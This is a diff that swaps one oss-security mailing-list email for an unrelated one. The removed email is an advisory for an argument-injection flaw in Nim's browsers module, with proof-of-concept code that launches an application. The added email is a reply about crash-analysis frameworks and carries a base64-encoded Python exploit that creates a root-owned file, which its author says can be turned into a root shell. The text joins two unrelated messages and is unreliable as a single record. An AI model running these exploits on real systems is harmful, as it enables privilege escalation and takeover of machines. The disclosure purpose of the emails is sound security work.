@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5275" "Thursday" "4" "February" "2021" "11:33:26" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<BF1D4D4E-FE1B-424C-ADBB-C53FF0B5054E@consensys.net>" "156" "[oss-security] [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection" nil nil nil "2" "2021020410:33:26" "[oss-security] [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection" (number mark "U       martin.ortne Feb  4  156/5275  " thread-indent "\"[oss-security] [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2181" "Wednesday" "15" "April" "2015" "12:55:53" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>" "51" "Re: [oss-security] Re: Problems in automatic crash analysis frameworks" nil nil nil "4" "2015041519:55:53" "[oss-security] Re: Problems in automatic crash analysis frameworks" (number mark "        taviso@googl Apr 15   51/2181  " thread-indent "\"Re: [oss-security] Re: Problems in automatic crash analysis frameworks\"\n") "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>" ("<20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>" "<552D3A20.8040909@canonical.com>" "<CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>" "<CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>" "<CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>" "<20150414221607.GA5795@boyd>" "<CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 1582 invoked by uid 550); 4 Feb 2021 11:02:59 -0000
+Received: (qmail 18351 invoked by uid 550); 15 Apr 2015 19:57:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,198 +11,98 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 23638 invoked from network); 4 Feb 2021 10:33:40 -0000
+Received: (qmail 18333 invoked from network); 15 Apr 2015 19:57:03 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=consensys.net; s=google;
-        h=from:mime-version:subject:message-id:date:to;
-        bh=OQ4F9w4DMkPYI/lvAWaJREbB39s1XZiaedCdkLtljVg=;
-        b=Nxi8LzpzR8pSutx+FWjMHxh04oM96v4WpvUSlHLB5dbkSkloXVcExMTvoxXdblTNJ9
-         7XnrR56CpH2C298lXbiMRCB0SqaC2SvYKEic3gP3UVpJZNQePWXXOe+Mvn4JMIcNHEtx
-         olbNkGwEBGA7+zwBREcbUNzhOGXz4/uDWI9vsrKhJiRpJMoY+BrMME28MMjoCnr04l7U
-         H+dUzptEYAsYO3nh8KcCvidX2OZId9BGCh9CFgUn+MuORre+InK2F2/XL3QoQaWPmnOw
-         U2YJW6GskX9kESMciJBMZ8djJ6LtfLjhWQeOP3RPd4zlMSkBrXJyLnqV3IVooul7gIld
-         MLGg==
+        d=google.com; s=20120113;
+        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
+         :cc:content-type;
+        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
+        b=JFm6V9Uy3sf2mRhwEwXAUFJ52xhFJziKfE2rAbfZYfR3Vjhc2S1EpHNK+mGBCMc/9L
+         osHtUitJmzdJ+qeP45vGIbu58MPK7zCjRzPy+vWKeNuW+s+kXrWJpKlSy5yUVfiMwa1R
+         pktAGrOqKtdsaibRZJqjxn62BOLLXr4gKXDwd6uKLdkGmS5geUKZpD4+mW1VjMLXxBGD
+         onBOMBLNUIoBHwxzQwcgY5QX0P2koctTpjXpVRJoIWB5rm7GAREuaUwOtjWQvbzNv1tE
+         lUrl5oGLqr+Og4WMZMRb7nhBenmT5goXn8RTyUZvFnQmPLnSslE/THtlGEjnFhrStbHy
+         r2ag==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:mime-version:subject:message-id:date:to;
-        bh=OQ4F9w4DMkPYI/lvAWaJREbB39s1XZiaedCdkLtljVg=;
-        b=Ybl+dbGcXaDcV4KZ3JugZWJNbpmorOthKsVDPYL87WtXC3UC3lZxlkGqUhpSuLLoYy
-         wRkSrObx0+IZdRb1jEHZ1Mn+AqcQJpA34jKcJQI0h1HMfb73CgBd7fzlcplySiqns34Q
-         gMY1gaWnlgh4BYX0cGNhiSZnBVB7qjjrbDGBflvCaUcMiBguEgSaW5ASQDxhNjRusn0J
-         iF7QOyMr1zeg2Q/H7RnpGykc2l/zko2nTShO0HVVVsd86IH/i6XG/9YK76YvqNyBZEjS
-         vMGeT7C5EZGLpEVRFoLUWEN9bPaN8fCXIN6qSoubL1UnJ6FXovyVDoRFWE50f/NFDEr+
-         hZSA==
-X-Gm-Message-State: AOAM531fevHYi1ycn0chigRNqUudDHSnYZ+0KC1MEBA9TF5Xv/Kiw+1T
-	kPlq6DsxAHtyZHZCKpH29nikmyoJA6qE/M/m69DU3j+fBX+6kbxrPdzoScK5ycJgqAmunKIqR7L
-	GisJsEkyzcPoXtui6prGNcBCuq4CuMjVfcIgkW66NGglKU43OlUlUZoZb2sU2JGc5bTbAUQDF74
-	L1mHXyrwsZDQ7HkE7I7PM=
-X-Google-Smtp-Source: ABdhPJwZqNRUITL/adGWsbxBYvqrMFVZ3+51iwucNULXH4BvlvJBMZDceNpLHPNRpkmVI4Uylan9Fg==
-X-Received: by 2002:a1c:e309:: with SMTP id a9mr6821162wmh.99.1612434808356;
-        Thu, 04 Feb 2021 02:33:28 -0800 (PST)
-From: Martin Ortner <martin.ortner@consensys.net>
-Content-Type: multipart/alternative;
-	boundary="Apple-Mail=_DDFC6CAE-6FEA-4D24-94AC-2A36E1B7A5AA"
-Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
-Message-Id: <BF1D4D4E-FE1B-424C-ADBB-C53FF0B5054E@consensys.net>
-Date: Thu, 4 Feb 2021 11:33:26 +0100
-To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3608.120.23.2.4)
-Subject: [oss-security] [CVE-2020-15692] Nim - stdlib Browsers - `open` Argument Injection
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
+         :message-id:subject:to:cc:content-type;
+        bh=cWDisl28PwAypYB+4LX1uypk9HhgQRHxK7DgCa97Nes=;
+        b=kmcRKx7/WByIcMXkxBSnxydKQ8oRrgfGe5gf0EFq8xmk7Fk2Sed4VOj6aUMZ6dKrod
+         iHAXDGjzCL0zTX+Bbvpfm6smY4ZOBQ5oQZ3E3ecWzOjFPZ2aSMlGbwOJdwjkg3O0SyXE
+         6B6qehstUNN7Z4l6DSEnbw+lMlR3YdE638Mbrd5KrnbTIbIhTSnKi9K0YGovanyO5/57
+         R2TFBN6RmdA+Hr/ik8CaINUgWhT7BkeitPH/ren7ioz5RkwPvI91rnVbRQ/kzvSi0/mP
+         ls+5idPwMCO4NzIueO6cgKOtcd4hVaedK2t8VNmeF5+soTGF2akPVWtoeoba4Q/ur+fs
+         cLAw==
+X-Gm-Message-State: ALoCoQnKDNEC7OoK6OxthQSC+UGHOG/rQTFojvWH8ZecQP5KoyOQSecUVLo0pDQ/Z88SPsVL+luF
+X-Received: by 10.229.122.138 with SMTP id l10mr35123430qcr.26.1429127774607;
+ Wed, 15 Apr 2015 12:56:14 -0700 (PDT)
+MIME-Version: 1.0
+In-Reply-To: <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
+References: <20150414155515.BFCAD6C0075@smtpvmsrv1.mitre.org>
+ <552D3A20.8040909@canonical.com> <CAJ_zFkLtZteX-ge_=9jE8KHxDmKZ=7cwWUmwkHwGHbnCpiQWZA@mail.gmail.com>
+ <CAJ_zFk+7eV52Ui1+aV+BKhc68zKi3pmPsgPmFoOsw8Qg6dHPAQ@mail.gmail.com>
+ <CAJ_zFkLA=Qn_exvDW8Rym1jx_jS0vo=vuTJ7ON71qk8BSB=1dw@mail.gmail.com>
+ <20150414221607.GA5795@boyd> <CAJ_zFkLHirkfhNbHGne8V_n2RJ_kS_LL7MLA8_Sw3Tp-Q85T8Q@mail.gmail.com>
+Message-ID: <CAJ_zFkLAM+5DpyS4L6aqiyKT4AZY7fbW+5M7+=rBYNcE-Cr6aw@mail.gmail.com>
+Content-Type: multipart/mixed; boundary=001a1134a8b45856c00513c8bd75
+Cc: oss-security@lists.openwall.com, 
+	Assign a CVE Identifier <cve-assign@mitre.org>, security <security@ubuntu.com>, 
+	=?UTF-8?Q?St=C3=A9phane_Graber?= <stgraber@ubuntu.com>
+Date: Wed, 15 Apr 2015 12:55:53 -0700
+From: Tavis Ormandy <taviso@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Re: Problems in automatic crash analysis frameworks
+To: Tyler Hicks <tyhicks@canonical.com>
 
---Apple-Mail=_DDFC6CAE-6FEA-4D24-94AC-2A36E1B7A5AA
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-	charset=utf-8
+--001a1134a8b45856c00513c8bd75
+Content-Type: text/plain; charset=UTF-8
 
-title: "Nim - stdlib Browsers - `open` Argument Injection"
-date: 2020-07-30T19:32:09+01:00
+On Wed, Apr 15, 2015 at 11:48 AM, Tavis Ormandy <taviso@google.com> wrote:
+> FWIW, I verified this is exploitable.
+>
 
-cve: ["CVE-2020-15692"]
-vendor: nim-lang
-vendorUrl: https://nim-lang.org/
-authors: tintinweb
-affectedVersions: [ "<=3D 1.2.6" ]
-vulnClass: CWE-88
+Here's the script I used to verify, it should create the file
+/etc/rootfiletest. By using the partial trick or creating parse
+errors, this is easy to turn into a root shell.
 
-Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-bro=
-wsers-argument-injection/ <https://consensys.net/diligence/vulnerabilities/=
-nim-browsers-argument-injection/>=20
-Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2=
-020-15692 <https://github.com/tintinweb/pub/tree/master/pocs/cve-2020-15692>
-Group: https://consensys.net/diligence/research/
+Note: I'm a c programmer, I don't know python at all, it's probably
+the worlds worst python code - I used python because I was reading the
+python3-lxc code.
 
+taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
+ls: cannot access /etc/rootfiletest: No such file or directory
+taviso@ubuntu:~/tmp$ rm -rf /tmp/?0* /tmp/exploit/
+taviso@ubuntu:~/tmp$ python3 test.py
+taviso@ubuntu:~/tmp$ ls -l /etc/rootfiletest
+-rw-rw---- 1 root root 0 Apr 15 12:53 /etc/rootfiletest
 
-## Summary=20
+Tavis.
 
-The nim-lang stdlib `browsers` provides a convenient interface to open an U=
-RL with the system default browser. The library, however, fails to validate=
-d that the provided input is actually an URL. An attacker in control of an =
-unfiltered URL passed to `browsers.openDefaultBrowser(URL)` can, therefore,=
- provide a local file path that will be opened in the default explorer or p=
-ass one argument to the underlying `open` command to execute arbitrary regi=
-stered system commands.=20
+--001a1134a8b45856c00513c8bd75
+Content-Type: text/x-python; charset=US-ASCII; name="exploit.py"
+Content-Disposition: attachment; filename="exploit.py"
+Content-Transfer-Encoding: base64
+X-Attachment-Id: f_i8j5o1rr0
 
-## Details
+IyEvdXNyL2Jpbi9weXRob24zCiMgVGVzdCBzY3JpcHQgZm9yIGFwcG9ydCB2
+dWxuZXJhYmlsaXR5LgojICB0YXZpc29AY21weGNoZzhiLmNvbQoKaW1wb3J0
+IHNvY2tldCwgb3MsIHNpZ25hbAppbXBvcnQgY3R5cGVzCgpvcy5ta2Rpcign
+L3RtcC9cbjAgMSAyIDMgNCA1IDYgJykKb3MubWtkaXIoJy90bXAvXG4wIDEg
+MiAzIDQgNSA2IC90bXAnKQpvcy5ta2RpcignL3RtcC9cbjAgMSAyIDMgNCA1
+IDYgL3RtcC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvXG4wIDEgMiAzIDQg
+NSA2IC90bXAvZXhwbG9pdC9leHBsb2l0JykKb3MubWtkaXIoJy90bXAvZXhw
+bG9pdC8nKQpvcy5ta2RpcignL3RtcC9leHBsb2l0L2V4cGxvaXQvJykKCmYg
+PSBvcGVuKCcvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb25maWcnLCAndycpCmYu
+d3JpdGUoImx4Yy5sb2dmaWxlID0gL2V0Yy9yb290ZmlsZXRlc3RcbiIpCmYu
+Y2xvc2UoKQoKc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX1VOSVgs
+IHNvY2tldC5TT0NLX1NUUkVBTSkKc29jay5iaW5kKCcvdG1wL1xuMCAxIDIg
+MyA0IDUgNiAvdG1wL2V4cGxvaXQvZXhwbG9pdC9jb21tYW5kJykKc29jay5s
+aXN0ZW4oMSkKCmxpYmMgPSBjdHlwZXMuQ0RMTCgibGliYy5zby42IikKCmxp
+YmMudW5zaGFyZSgweDIwMDAwMDAwfDB4MTAwMDAwMDApCgppZiBsaWJjLmZv
+cmsoKSA9PSAwOgoJaWYgbGliYy5mb3JrKCkgPT0gMDoKCQlvcy5raWxsKGxp
+YmMuZ2V0cGlkKCksIHNpZ25hbC5TSUdTRUdWKQoJZWxzZToKCQlsaWJjLndh
+aXRwaWQoLTEsIDAsIDApCmVsc2U6CglsaWJjLndhaXRwaWQoLTEsIDAsIDAp
+Cg==
 
-### Description
-
-`browsers.openDefaultBrowser()` internally calls `shellExecuteW` passing in=
- the URL as an arg to `open` for Windows and `execShellCmd` with the OS's o=
-pen command (`xdg-open` on linux, `open` on MacOs) and the shell quoted `ur=
-l` as an argument on nix systems.=20
-
-The implementation is as follows:
-
-```nim
-template openDefaultBrowserImpl(url: string) =3D=20
-  when defined(windows):
-    var o =3D newWideCString(osOpenCmd)
-    var u =3D newWideCString(url)
-    discard shellExecuteW(0'i32, o, u, nil, nil, SW_SHOWNORMAL)
-  elif defined(macosx):
-    discard execShellCmd(osOpenCmd & " " & quoteShell(url))=20
-  else:
-    var u =3D quoteShell(url)
-    if execShellCmd(osOpenCmd & " " & u) =3D=3D 0: return
-    for b in getEnv("BROWSER").string.split(PathSep):
-      try:
-        # we use ``startProcess`` here because we don't want to block!
-        discard startProcess(command =3D b, args =3D [url], options =3D {po=
-UsePath})
-        return
-      except OSError:
-        discard
-```
-
-On windows, the attacker controls the `lpFile` argument to `shellExecuteW` =
-which may allow opening arbitrary local files.
-On MacOs, the attacker controls the first argument to the `open` command wh=
-ich takes the following command line switches:
-
-```
-Options:=20
-      -a                Opens with the specified application.
-      -b                Opens with the specified application bundle identif=
-ier.
-      -e                Opens with TextEdit.
-      -t                Opens with default text editor.
-      -f                Reads input from standard input and opens with Text=
-Edit.
-      -F  --fresh       Launches the app fresh, that is, without restoring =
-windows. Saved persistent state is lost, excluding Untitled documents.
-      -R, --reveal      Selects in the Finder instead of opening.
-      -W, --wait-apps   Blocks until the used applications are closed (even=
- if they were already running).
-          --args        All remaining arguments are passed in argv to the a=
-pplication's main() function instead of opened.
-      -n, --new         Open a new instance of the application even if one =
-is already running.
-      -j, --hide        Launches the app hidden.
-      -g, --background  Does not bring the application to the foreground.
-      -h, --header      Searches header file locations for headers matching=
- the given filenames, and opens them.
-      -s                For -h, the SDK to use; if supplied, only SDKs whos=
-e names contain the argument value are searched.
-                        Otherwise the highest versioned SDK in each platfor=
-m is used.
-```
-
-If an attacker manages to pass in an URL that is actually a commandline swi=
-tche to open, they may be able to launch arbitrary commands (or do whatever=
- open allows them to do with one argument). For example, `openDefaultBrowse=
-r(".")` will open Finder in the current working dir, `openDefaultBrowser("-=
-aCalculator")` and `openDefaultBrowser("-bcom.apple.calculator")` launches =
-the calculator.=20
-
-
-### Proof of Concept
-
-
-launch calculator:
-
-```nim
-import browsers
-openDefaultBrowser("-bcom.apple.calculator")=20
-```
-
-terminate the shell quoting causing an error:
-
-```nim
-import browsers
-var vector =3D "-bcom.apple.calculator\x00"
-openDefaultBrowser(vector)=20
-
-```
-
-```
-=E2=87=92  nim c -r -d:ssl test.nim
-sh: -c: line 0: unexpected EOF while looking for matching `''
-sh: -c: line 1: syntax error: unexpected end of file
-```
-
-
-## Vendor Response
-
-Vendor response: fixed in [v1.2.6](https://nim-lang.org/blog/2020/07/30/ver=
-sions-126-and-108-released.html)
-
-
-### Timeline
-
-```
-JUL/09/2020 - contact the development team @telegram; provided details, PoC
-JUL/30/2020 - fixed in new release
-```
-
-## References
-
-
-* [1] https://nim-lang.org/
-* [2] https://nim-lang.org/install.html
-* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
-* [4] https://nim-lang.org/blog/2020/07/30/versions-126-and-108-released.ht=
-ml
-
-
---Apple-Mail=_DDFC6CAE-6FEA-4D24-94AC-2A36E1B7A5AA--
+--001a1134a8b45856c00513c8bd75--
